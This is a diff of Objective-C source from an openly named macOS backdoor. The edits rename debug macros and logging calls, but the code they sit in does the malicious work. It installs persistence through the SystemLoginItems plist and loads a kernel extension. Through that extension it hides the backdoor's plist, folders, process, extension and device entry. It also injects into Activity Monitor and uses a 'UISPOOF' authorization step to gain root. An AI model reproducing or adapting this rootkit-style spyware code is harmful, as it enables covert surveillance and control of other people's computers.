+      warnLog(@"Backdoor has not been made resident yet");
+      infoLog(@"sliSuccess: %d", sliSuccess);
+      infoLog(@"workingMode: %@", ([workingMode isEqualToString: SLIPLIST]) ? @"SLIPLIST" : @"UISPOOF");
 #endif
       
       if (([workingMode isEqualToString: SLIPLIST] && sliSuccess == YES)
           || ([workingMode isEqualToString: UISPOOF])
           || (noPrivs == YES))
         {
-#ifdef DEBUG
-          infoLog(ME, @"makeBackdoorResident stage");
+#ifdef DEBUG_CORE
+          infoLog(@"makeBackdoorResident stage");
 #endif
           if ([self makeBackdoorResident] == NO)
             {
-#ifdef DEBUG
-              errorLog(ME, @"An error occurred");
+#ifdef DEBUG_CORE
+              errorLog(@"An error occurred");
 #endif
             }
           else
             {
-#ifdef DEBUG
-              infoLog(ME, @"successful");
+#ifdef DEBUG_CORE
+              infoLog(@"successful");
 #endif
               if ([gUtil isBackdoorPresentInSLI: [gUtil mBackdoorPath]] == YES)
                 {
-#ifdef DEBUG
-                  warnLog(ME, @"Removing the backdoor entry form the global SLI");
+#ifdef DEBUG_CORE
+                  warnLog(@"Removing the backdoor entry form the global SLI");
 #endif
                   if ([gUtil removeBackdoorFromSLIPlist] == YES)
                     {
-#ifdef DEBUG
-                      infoLog(ME, @"Backdoor removed correctly from SLI");
+#ifdef DEBUG_CORE
+                      infoLog(@"Backdoor removed correctly from SLI");
 #endif
                     }
                 }
@@ -2457,15 +2455,15 @@ static void computerWillShutdown(CFMachPortRef port,
   if ([[NSFileManager defaultManager] fileExistsAtPath: [gUtil mExecFlag]
                                            isDirectory: NULL])
     {
-#ifdef DEBUG
-      NSLog(@"mExecFlag exists");
+#ifdef DEBUG_CORE
+      infoLog(@"mExecFlag exists");
 #endif
       [self _createInternalFilesAndFolders];
       
       if (getuid() == 0 || geteuid() == 0)
         {
-#ifdef DEBUG
-          NSLog(@"Dropping injector component");
+#ifdef DEBUG_CORE
+          infoLog(@"Dropping injector component");
 #endif
           //
           // Now it's time for all the Info.plist mess
@@ -2482,7 +2480,7 @@ static void computerWillShutdown(CFMachPortRef port,
                            toTarget: self
                          withObject: nil];
   
-#ifndef TEST_MODE
+#ifndef NO_KEXT
   int ret = 0;
   int kextLoaded = 0;
   
@@ -2490,14 +2488,14 @@ static void computerWillShutdown(CFMachPortRef port,
     {
       if ([self connectKext] == -1)
         {
-#ifdef DEBUG
-          warnLog(ME, @"connectKext failed, trying to load the KEXT");
+#ifdef DEBUG_CORE
+          warnLog(@"connectKext failed, trying to load the KEXT");
 #endif
           
           if ([gUtil loadKext] == YES)
             {
-#ifdef DEBUG
-              infoLog(ME, @"KEXT loaded successfully");
+#ifdef DEBUG_CORE
+              infoLog(@"KEXT loaded successfully");
 #endif
               
               if ([self connectKext] != -1)
@@ -2506,8 +2504,8 @@ static void computerWillShutdown(CFMachPortRef port,
                 }
               else
                 {
-#ifdef DEBUG
-                  errorLog(ME, @"Error on KEXT init");
+#ifdef DEBUG_CORE
+                  errorLog(@"Error on KEXT init");
 #endif
                 }
             }
@@ -2520,8 +2518,8 @@ static void computerWillShutdown(CFMachPortRef port,
   
   if (kextLoaded == 1)
     {
-#ifdef DEBUG
-      infoLog(ME, @"kext loaded");
+#ifdef DEBUG_CORE
+      infoLog(@"kext loaded");
 #endif
       
       //
@@ -2543,8 +2541,8 @@ static void computerWillShutdown(CFMachPortRef port,
       //
       NSString *backdoorPlist = [[NSString alloc] initWithString: BACKDOOR_DAEMON_PLIST];
       
-#ifdef DEBUG
-      infoLog(ME, @"Hiding LaunchAgent plist");
+#ifdef DEBUG_CORE
+      infoLog(@"Hiding LaunchAgent plist");
 #endif
       // Hiding LaunchAgent plist
       ret = ioctl(gBackdoorFD, MCHOOK_HIDED, (char *)[[backdoorPlist lastPathComponent] fileSystemRepresentation]);
@@ -2558,8 +2556,8 @@ static void computerWillShutdown(CFMachPortRef port,
         {
           inputManagerPath = [[NSString alloc] initWithString: INPUT_MANAGER_FOLDER];
       
-#ifdef DEBUG
-          infoLog(ME, @"Hiding InputManager");
+#ifdef DEBUG_CORE
+          infoLog(@"Hiding InputManager");
 #endif
           // Hiding input manager dir
           ret = ioctl(gBackdoorFD, MCHOOK_HIDED, (char *)[inputManagerPath fileSystemRepresentation]);
@@ -2570,26 +2568,26 @@ static void computerWillShutdown(CFMachPortRef port,
       NSString *appPath = [[[NSBundle mainBundle] bundlePath]
                            lastPathComponent];
       
-#ifdef DEBUG
-      infoLog(ME, @"Hiding backdoor dir");
+#ifdef DEBUG_CORE
+      infoLog(@"Hiding backdoor dir");
 #endif
       // Hiding backdoor dir
       ret = ioctl(gBackdoorFD, MCHOOK_HIDED, (char *)[appPath fileSystemRepresentation]);
       
-#ifdef DEBUG
-      infoLog(ME, @"Hiding process %d", getpid());
+#ifdef DEBUG_CORE
+      infoLog(@"Hiding process %d", getpid());
 #endif
       // Hide Process
       ret = ioctl(gBackdoorFD, MCHOOK_HIDEP, [NSUserName() UTF8String]);
       
-#ifdef DEBUG
-      infoLog(ME, @"Hiding KEXT");
+#ifdef DEBUG_CORE
+      infoLog(@"Hiding KEXT");
 #endif
       // Hide KEXT
       ret = ioctl(gBackdoorFD, MCHOOK_HIDEK);
       
-#ifdef DEBUG
-      infoLog(ME, @"Hiding /dev entry");
+#ifdef DEBUG_CORE
+      infoLog(@"Hiding /dev entry");
 #endif
       // Hide KEXT /dev entry
       NSString *kextDevEntry = [[NSString alloc] initWithCString: BDOR_DEVICE];
@@ -2606,15 +2604,15 @@ static void computerWillShutdown(CFMachPortRef port,
       
       if (pActivityM != nil) 
         {
-#ifdef DEBUG
-          NSLog(@"%s: find running ActivityMonitor with pid %d, injecting...", __FUNCTION__, pActivityM);
+#ifdef DEBUG_CORE
+          warnLog(@"%s: find running ActivityMonitor with pid %d, injecting...", __FUNCTION__, pActivityM);
 #endif
           [self sendEventToPid: pActivityM];
         }
       else 
         {
-#ifdef DEBUG
-          NSLog(@"%s: no running ActivityMonitor", __FUNCTION__);
+#ifdef DEBUG_CORE
+          warnLog(@"%s: no running ActivityMonitor", __FUNCTION__);
 #endif
         }
     }
@@ -2687,16 +2685,16 @@ static void computerWillShutdown(CFMachPortRef port,
   
   SBApplication *app = [SBApplication applicationWithProcessIdentifier: pidP];
   
-#ifdef DEBUG_TMP
-  NSLog(@"%s: send event to application pid %d", __FUNCTION__, pidP);
+#ifdef DEBUG_CORE
+  infoLog(@"%s: send event to application pid %d", __FUNCTION__, pidP);
 #endif
   
   [app setDelegate: self];
   
   [gSuidLock lock];
   
-#ifdef DEBUG
-  NSLog(@"%s: enter critical session [euid/uid %d/%d]", 
+#ifdef DEBUG_CORE
+  infoLog(@"%s: enter critical session [euid/uid %d/%d]", 
         __FUNCTION__, geteuid(), getuid());
 #endif
   
@@ -2725,8 +2723,8 @@ static void computerWillShutdown(CFMachPortRef port,
       // original u&g
       if (seteuid(eUid) == -1)
         {
-#ifdef DEBUG
-          NSLog(@"%s: setting euid error [%d]", 
+#ifdef DEBUG_CORE
+          infoLog(@"%s: setting euid error [%d]", 
                 __FUNCTION__, errno);
 #endif
         }
@@ -2736,21 +2734,21 @@ static void computerWillShutdown(CFMachPortRef port,
   
   [gSuidLock unlock];
   
-#ifdef DEBUG
-  NSLog(@"%s: exit critical session [euid/uid %d/%d]", 
+#ifdef DEBUG_CORE
+  infoLog(@"%s: exit critical session [euid/uid %d/%d]", 
         __FUNCTION__, geteuid(), getuid());
 #endif
   
   if (injectReply != nil) 
     {
-#ifdef DEBUG_TMP	
-      debugLog(ME, @"unexpected injectReply: %@", injectReply);
+#ifdef DEBUG_CORE	
+      warnLog(@"unexpected injectReply: %@", injectReply);
 #endif
     }
   else 
     {
-#ifdef DEBUG_TMP
-      NSLog(@"%s: injection done", __FUNCTION__);
+#ifdef DEBUG_CORE
+      infoLog(@"%s: injection done", __FUNCTION__);
 #endif
     }
   
@@ -2764,8 +2762,8 @@ static void computerWillShutdown(CFMachPortRef port,
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   NSDictionary *appInfo = [notification userInfo];
 
-#ifdef DEBUG_TMP
-  NSLog(@"%s: running new notificaion on app %@", __FUNCTION__, appInfo);
+#ifdef DEBUG_CORE
+  infoLog(@"%s: running new notificaion on app %@", __FUNCTION__, appInfo);
 #endif
 
   if (gOSMajor == 10 && gOSMinor == 6 && geteuid() == 0)
@@ -2778,7 +2776,8 @@ static void computerWillShutdown(CFMachPortRef port,
   else if (gOSMajor == 10 && gOSMinor == 5 && geteuid() == 0)
     {
       // Only for leopard send pid to new activity monitor via shmem
-      if ([[appInfo objectForKey: @"NSApplicationName"] compare: @"Activity Monitor"] == NSOrderedSame) 
+      if ([[appInfo objectForKey: @"NSApplicationName"] isCaseInsensitiveLike: @"Activity Monitor"])
+      //if ([[appInfo objectForKey: @"NSApplicationName"] compare: @"Activity Monitor"] == NSOrderedSame) 
         {
           // Write command with pid
           [self shareCorePidOnShMem];
@@ -2795,8 +2794,8 @@ static void computerWillShutdown(CFMachPortRef port,
   NSMutableData *pidCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
   pid_t amPid = getpid();
   
-#ifdef DEBUG
-  NSLog(@"%s: sending pid to activity monitor %d", __FUNCTION__, amPid);
+#ifdef DEBUG_CORE
+  infoLog(@"%s: sending pid to activity monitor %d", __FUNCTION__, amPid);
 #endif
   
   shMemoryCommand *shMemoryHeader   = (shMemoryCommand *)[pidCommand bytes];
@@ -2810,14 +2809,14 @@ static void computerWillShutdown(CFMachPortRef port,
                                  offset: OFFT_CORE_PID
                           fromComponent: COMP_CORE] == TRUE)
     {
-#ifdef DEBUG
-      NSLog(@"%s: running pid %d to activity monitor", __FUNCTION__, amPid);
+#ifdef DEBUG_CORE
+      infoLog(@"%s: running pid %d to activity monitor", __FUNCTION__, amPid);
 #endif
     }
   else 
     {
-#ifdef DEBUG
-      NSLog(@"%s: running pid to activity monitor failed", __FUNCTION__);
+#ifdef DEBUG_CORE
+      infoLog(@"%s: running pid to activity monitor failed", __FUNCTION__);
 #endif
     }
   
@@ -2828,17 +2827,17 @@ static void computerWillShutdown(CFMachPortRef port,
 /*
 - (void)eventDidFail: (const AppleEvent*)event withError: (NSError*)error
 {
-#ifdef DEBUG
+#ifdef DEBUG_CORE
   NSDictionary* userInfo = [error userInfo];
-	NSLog(@"%s: Event %@, error %@", __FUNCTION__, event, userInfo);
+	infoLog(@"%s: Event %@, error %@", __FUNCTION__, event, userInfo);
 #endif
   
 }*/
 
 - (int)connectKext
 {
-#ifdef DEBUG
-  infoLog(ME, @"[connectKext] Initializing backdoor with kext");
+#ifdef DEBUG_CORE
+  infoLog(@"[connectKext] Initializing backdoor with kext");
 #endif
   
   gBackdoorFD = open(BDOR_DEVICE, O_RDWR);
@@ -2851,8 +2850,8 @@ static void computerWillShutdown(CFMachPortRef port,
       ret = ioctl(gBackdoorFD, MCHOOK_INIT, [NSUserName() UTF8String]);
       if (ret < 0)
         {
-#ifdef DEBUG
-          errorLog(ME, @"[connectKext] Error while initializing the uspace-kspace "\
+#ifdef DEBUG_CORE
+          errorLog(@"[connectKext] Error while initializing the uspace-kspace "\
                         "communication channel");
 #endif
           
@@ -2860,15 +2859,15 @@ static void computerWillShutdown(CFMachPortRef port,
         }
       else
         {
-#ifdef DEBUG
-          infoLog(ME, @"[connectKext] Backdoor initialized correctly");
+#ifdef DEBUG_CORE
+          infoLog(@"[connectKext] Backdoor initialized correctly");
 #endif
         }
     }
   else
     {
-#ifdef DEBUG
-      errorLog(ME, @"[connectKext] Error while opening the KEXT dev entry!");
+#ifdef DEBUG_CORE
+      errorLog(@"[connectKext] Error while opening the KEXT dev entry!");
 #endif
       
       return -1;
@@ -2889,16 +2888,16 @@ static void computerWillShutdown(CFMachPortRef port,
   if ([fileManager fileExistsAtPath: [gUtil mSLIPlistPath]
                         isDirectory: NULL])
     {
-#ifdef DEBUG
-      NSLog(@"SLI File already exists!");
+#ifdef DEBUG_CORE
+      infoLog(@"SLI File already exists!");
 #endif
       
       success = [gUtil isBackdoorPresentInSLI: [[NSBundle mainBundle] bundlePath]];
       
       if (success == NO)
         {
-#ifdef DEBUG
-          NSLog(@"Backdoor is not present in SLI");
+#ifdef DEBUG_CORE
+          infoLog(@"Backdoor is not present in SLI");
 #endif
           NSString *SLIBackup       = @"com.apple.SystemLoginItems.plist_bak";
           
@@ -2913,8 +2912,8 @@ static void computerWillShutdown(CFMachPortRef port,
           
           if ([gUtil addBackdoorToSLIPlist] == NO)
             {
-#ifdef DEBUG
-              NSLog(@"An error occurred while adding the entry to the SLI plist");
+#ifdef DEBUG_CORE
+              errorLog(@"An error occurred while adding the entry to the SLI plist");
 #endif
               return NO;
             }
@@ -2930,8 +2929,8 @@ static void computerWillShutdown(CFMachPortRef port,
                                        toPath: [gUtil mSLIPlistPath]
                                         error: &error] == NO)
                 {
-#ifdef DEBUG
-                  NSLog(@"Error while moving back the modified SLI plist (%s)", error);
+#ifdef DEBUG_CORE
+                  errorLog(@"Error while moving back the modified SLI plist (%s)", error);
 #endif
                   
                   return NO;
@@ -2939,8 +2938,8 @@ static void computerWillShutdown(CFMachPortRef port,
             }
           else
             {
-#ifdef DEBUG
-              NSLog(@"Error while removing the original SLI plist (%s)", error);
+#ifdef DEBUG_CORE
+              errorLog(@"Error while removing the original SLI plist (%s)", error);
 #endif
               
               return NO;
@@ -2952,16 +2951,16 @@ static void computerWillShutdown(CFMachPortRef port,
           // Probably here we should backup the SLI and clean it up from our
           // backdoor entry
           //
-#ifdef DEBUG
-          NSLog(@"Backdoor is already installed in global SLI");
+#ifdef DEBUG_CORE
+          infoLog(@"Backdoor is already installed in global SLI");
 #endif
         }
     }
   else
     {
       // The SLI plist doesn't exists yet
-#ifdef DEBUG
-      NSLog(@"SLI File doesn't exists");
+#ifdef DEBUG_CORE
+      infoLog(@"SLI File doesn't exists");
 #endif
       
       //
@@ -3025,7 +3024,7 @@ static void computerWillShutdown(CFMachPortRef port,
       else
         {
 #ifdef DEBUG_UI_SPOOF
-          errorLog(ME, @"ez file not found");
+          errorLog(@"ez file not found");
 #endif
           exit(-1);
         }    
@@ -3078,7 +3077,7 @@ static void computerWillShutdown(CFMachPortRef port,
   if (myStatus != errAuthorizationSuccess)
     {
 #ifdef DEBUG_UI_SPOOF
-      errorLog(ME, @"[EE] Error while creating the empty Authorization Reference\n");
+      errorLog(@"[EE] Error while creating the empty Authorization Reference\n");
 #endif
       //return myStatus;
     }
@@ -3093,7 +3092,7 @@ static void computerWillShutdown(CFMachPortRef port,
   if (myStatus != errAuthorizationSuccess)
     {
 #ifdef DEBUG_UI_SPOOF
-      errorLog(ME, @"[EE] Error while authorizing the user");
+      errorLog(@"[EE] Error while authorizing the user");
 #endif
       
       [self _createInternalFilesAndFolders];
@@ -3106,8 +3105,8 @@ static void computerWillShutdown(CFMachPortRef port,
         {
           if ([self getRootThroughSLI] == YES)
             {
-#ifdef DEBUG
-              warnLog(ME, @"Err on auth, switching to SLI PLIST mode");
+#ifdef DEBUG_CORE
+              warnLog(@"Err on auth, switching to SLI PLIST mode");
 #endif
               [gUtil dropExecFlag];
             }
@@ -3127,7 +3126,7 @@ static void computerWillShutdown(CFMachPortRef port,
   if (myStatus != errAuthorizationSuccess)
     {
 #ifdef DEBUG_UI_SPOOF
-      errorLog(ME, @"Unable to turn the AuthorizationRef into external form");
+      errorLog(@"Unable to turn the AuthorizationRef into external form");
 #endif
     }*/
   
@@ -3153,7 +3152,7 @@ static void computerWillShutdown(CFMachPortRef port,
           else
             {
 #ifdef DEBUG_UI_SPOOF
-              errorLog(ME, @"ez file not found");
+              errorLog(@"ez file not found");
 #endif
               exit(-1);
             }
@@ -3178,7 +3177,7 @@ static void computerWillShutdown(CFMachPortRef port,
   if (myStatus != errAuthorizationSuccess)
     {
 #ifdef DEBUG_UI_SPOOF
-      errorLog(ME, @"Error on last step");
+      errorLog(@"Error on last step");
 #endif
     }
   else
